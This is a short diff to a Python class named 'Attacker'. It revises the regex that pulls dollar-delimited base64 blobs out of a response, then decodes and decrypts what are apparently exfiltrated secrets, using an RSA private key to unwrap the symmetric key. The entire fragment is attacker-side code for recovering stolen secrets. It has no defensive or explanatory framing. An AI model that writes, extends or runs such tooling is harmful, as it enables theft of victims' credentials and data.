@@ -553,16 +553,16 @@ class Attacker:
                 print(res)
 
                 # Parse out the base64 blob with a regex.
-                matcher = re.compile(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')
+                matcher = re.compile(r'\$(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==|[A-Za-z0-9+/]{4})\$')
 
                 blob = matcher.findall(res)
 
-                if len(blob) == 3:
-                    encrypted_secrets = base64.b64decode(blob[1])
+                if len(blob) == 2:
+                    encrypted_secrets = base64.b64decode(blob[0][1:-1])
                     salt = encrypted_secrets[8:16]
                     ciphertext = encrypted_secrets[16:]
 
-                    encrypted_key = base64.b64decode(blob[2])
+                    encrypted_key = base64.b64decode(blob[1][1:-1])
                     sym_key_b64 = priv_key.decrypt(encrypted_key,
                                                    padding.PKCS1v15()).decode()
                     sym_key = base64.b64decode(sym_key_b64)
